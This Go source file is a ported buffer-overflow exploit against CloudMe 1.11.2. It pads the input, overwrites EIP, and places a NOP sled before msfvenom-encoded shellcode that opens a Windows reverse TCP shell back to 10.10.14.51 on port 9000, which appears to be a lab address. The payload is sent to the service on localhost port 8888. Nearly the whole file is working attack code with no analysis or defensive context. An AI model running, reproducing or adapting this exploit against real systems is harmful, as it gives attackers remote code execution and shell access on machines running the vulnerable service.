// ported from => https://packetstormsecurity.com/files/157407/cloudme1112-overflow.txt
//https://0x00sec.org/t/weaponized-exploit-writing-in-go-fusion0/3184

package main

import (
	"net"
	"strings"
	"fmt"
	"log"
)

func main(){

	padding1 := strings.Repeat("\x90",1052)
	EIP := "\xB5\x42\xA8\x68" 
	NOPS := strings.Repeat("\x90",30)

	//msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.51 LPORT=9000 --encoder x86/xor_dynamic -f python

	bu :=  ""
	bu += "\xeb\x23\x5b\x89\xdf\xb0\x12\xfc\xae\x75\xfd\x89\xf9"
	bu += "\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xfb\x36\x74"
	bu += "\x08\x46\x80\x3e\x12\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
	bu += "\xff\xff\xff\x13\x12\xef\xfb\x91\x13\x13\x13\x73\x9a"
	bu += "\xf6\x22\xd3\x77\x98\x43\x23\x98\x41\x1f\x98\x41\x07"
	bu += "\x98\x61\x3b\x1c\xa4\x59\x35\x22\xec\xbf\x2f\x72\x6f"
	bu += "\x11\x3f\x33\xd2\xdc\x1e\x12\xd4\xf1\xe1\x41\x44\x98"
	bu += "\x41\x03\x98\x59\x2f\x98\x5f\x02\x6b\xf0\x5b\x12\xc2"
	bu += "\x42\x98\x4a\x33\x12\xc0\x98\x5a\x0b\xf0\x29\x5a\x98"
	bu += "\x27\x98\x12\xc5\x22\xec\xbf\xd2\xdc\x1e\x12\xd4\x2b"
	bu += "\xf3\x66\xe5\x10\x6e\xeb\x28\x6e\x37\x66\xf7\x4b\x98"
	bu += "\x4b\x37\x12\xc0\x75\x98\x1f\x58\x98\x4b\x0f\x12\xc0"
	bu += "\x98\x17\x98\x12\xc3\x9a\x57\x37\x37\x48\x48\x72\x4a"
	bu += "\x49\x42\xec\xf3\x4c\x4c\x49\x98\x01\xf8\x9e\x4e\x7b"
	bu += "\x20\x21\x13\x13\x7b\x64\x60\x21\x4c\x47\x7b\x5f\x64"
	bu += "\x35\x14\x9a\xfb\xec\xc3\xab\x83\x12\x13\x13\x3a\xd7"
	bu += "\x47\x43\x7b\x3a\x93\x78\x13\xec\xc6\x79\x19\x7b\x19"
	bu += "\x19\x1d\x20\x7b\x11\x13\x30\x3b\x9a\xf5\x43\x43\x43"
	bu += "\x43\x53\x43\x53\x43\x7b\xf9\x1c\xcc\xf3\xec\xc6\x84"
	bu += "\x79\x03\x45\x44\x7b\x8a\xb6\x67\x72\xec\xc6\x96\xd3"
	bu += "\x67\x19\xec\x5d\x1b\x66\xff\xfb\x74\x13\x13\x13\x79"
	bu += "\x13\x79\x17\x45\x44\x7b\x11\xca\xdb\x4c\xec\xc6\x90"
	bu += "\xeb\x13\x6d\x25\x98\x25\x79\x53\x7b\x13\x03\x13\x13"
	bu += "\x45\x79\x13\x7b\x4b\xb7\x40\xf6\xec\xc6\x80\x40\x79"
	bu += "\x13\x45\x40\x44\x7b\x11\xca\xdb\x4c\xec\xc6\x90\xeb"
	bu += "\x13\x6e\x3b\x4b\x7b\x13\x53\x13\x13\x79\x13\x43\x7b"
	bu += "\x18\x3c\x1c\x23\xec\xc6\x44\x7b\x66\x7d\x5e\x72\xec"
	bu += "\xc6\x4d\x4d\xec\x1f\x37\x1c\x96\x63\xec\xec\xec\xfa"
	bu += "\x88\xec\xec\xec\x12\xd0\x3a\xd5\x66\xd2\xd0\xa8\xe3"
	bu += "\xa6\xb1\x45\x79\x13\x40\xec\xc6\xfb\x36"
	
	length := len(padding1 + NOPS + EIP + bu)
	overrun := strings.Repeat("C",1500 - length)
	
	buf := padding1 + EIP + NOPS + bu + overrun

	conn,err:= net.Dial("tcp","127.0.0.1:8888")
	if err != nil {
		fmt.Println("Connection failed\n")
		log.Fatal(err)
	}
	defer conn.Close()
	conn.Write([]byte(buf))

}